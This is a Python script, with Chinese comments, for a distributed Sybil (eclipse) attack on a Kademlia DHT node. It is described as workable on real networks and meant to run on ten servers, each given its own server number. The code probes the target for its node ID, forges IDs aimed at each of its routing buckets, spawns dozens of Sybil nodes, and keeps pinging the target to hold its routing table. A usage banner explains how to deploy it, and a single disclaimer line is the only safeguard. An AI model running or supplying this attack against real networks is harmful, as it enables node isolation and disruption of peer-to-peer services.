"""
分布式女巫攻击脚本 - 实网可行版本
需要多台服务器或多个VPS，每台运行此脚本
"""
import asyncio
import logging
import random
import socket
import sys
from kademlia.node import Node
from kademlia.utils import ID_BITS

# --- 攻击配置 ---
TARGET_HOSTNAME = "目标节点地址"
TARGET_PORT = 8000

# 分布式配置
TOTAL_SERVERS = 10  # 总共使用的服务器数量
MY_SERVER_ID = int(sys.argv[1]) if len(sys.argv) > 1 else 0  # 当前服务器编号
NODES_PER_SERVER = 26  # 每台服务器生成的节点数（256/10）

START_PORT = 9000 + (MY_SERVER_ID * 1000)  # 每台服务器使用不同端口段

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(name)s] %(message)s')
logger = logging.getLogger(f"Sybil-Server-{MY_SERVER_ID}")


async def get_target_id(target_ip, target_port):
    """侦察目标节点ID"""
    logger.info("?? Reconnaissance phase...")
    recon_node = Node(random.getrandbits(32), START_PORT - 1)
    await recon_node.start()
    
    target_contact = {'id': 0, 'ip': target_ip, 'port': target_port}
    is_alive = await recon_node.protocol.ping(target_contact)
    
    target_id = None
    if is_alive:
        for bucket in recon_node.routing_table.buckets:
            for contact in bucket:
                if contact['ip'] == target_ip and contact['port'] == target_port:
                    target_id = contact['id']
                    break
            if target_id:
                break
    
    if recon_node.protocol.transport:
        recon_node.protocol.transport.close()
    
    return target_id


def generate_targeted_id(target_id, bit_index):
    """生成针对特定bucket的节点ID"""
    prefix_mask = (1 << bit_index)
    if bit_index > 0:
        noise = random.getrandbits(bit_index)
    else:
        noise = 0
    return target_id ^ prefix_mask ^ noise


async def create_sybil_node(node_id, port):
    node = Node(node_id, port)
    await node.start()
    return node


async def run_distributed_attack():
    """分布式攻击主逻辑"""
    logger.info(f"? Starting distributed attack from Server #{MY_SERVER_ID}")
    logger.info(f"? This server will create {NODES_PER_SERVER} nodes")
    
    # 解析目标IP
    try:
        target_ip = socket.gethostbyname(TARGET_HOSTNAME)
        logger.info(f"? Target IP: {target_ip}")
    except Exception as e:
        logger.error(f"? Failed to resolve target: {e}")
        return
    
    # 获取目标ID
    target_id = await get_target_id(target_ip, TARGET_PORT)
    if target_id is None:
        logger.error("? Failed to retrieve target ID")
        return
    
    logger.info(f"? Target ID: {target_id:08x}")
    
    sybils = []
    current_port = START_PORT
    
    # 计算这台服务器负责哪些bucket
    buckets_per_server = ID_BITS // TOTAL_SERVERS
    start_bucket = MY_SERVER_ID * buckets_per_server
    end_bucket = start_bucket + buckets_per_server
    
    # 生成攻击节点
    for bucket_idx in range(start_bucket, end_bucket):
        nodes_in_bucket = NODES_PER_SERVER // buckets_per_server
        
        for _ in range(nodes_in_bucket):
            attack_id = generate_targeted_id(target_id, bucket_idx)
            node = await create_sybil_node(attack_id, current_port)
            sybils.append(node)
            current_port += 1
            
            if len(sybils) % 10 == 0:
                await asyncio.sleep(0.1)
    
    logger.info(f"? Deployed {len(sybils)} nodes on this server")
    logger.info(f"? Starting maintenance loop...")
    
    target_contact = {'id': target_id, 'ip': target_ip, 'port': TARGET_PORT}
    
    # 持续维护
    while True:
        for node in sybils:
            try:
                asyncio.create_task(node.protocol.ping(target_contact))
            except Exception:
                pass
        
        logger.info(f"? Heartbeat sent from {len(sybils)} nodes")
        await asyncio.sleep(20)


if __name__ == '__main__':
    print("""
    ╔════════════════════════════════════════════════════════════╗
    ║  分布式女巫攻击 - 实网可行版本                              ║
    ╠════════════════════════════════════════════════════════════╣
    ║  使用方法：                                                 ║
    ║  1. 在多台服务器上部署此脚本                                ║
    ║  2. 在每台服务器上运行：                                    ║
    ║     python distributed_sybil.py <服务器编号>                ║
    ║                                                             ║
    ║  示例：                                                     ║
    ║     服务器1: python distributed_sybil.py 0                  ║
    ║     服务器2: python distributed_sybil.py 1                  ║
    ║     ...                                                     ║
    ║     服务器10: python distributed_sybil.py 9                 ║
    ║                                                             ║
    ║  ?? 仅用于授权的安全测试环境                                ║
    ╚════════════════════════════════════════════════════════════╝
    """)
    
    try:
        asyncio.run(run_distributed_attack())
    except KeyboardInterrupt:
        logger.info("Attack stopped by user")
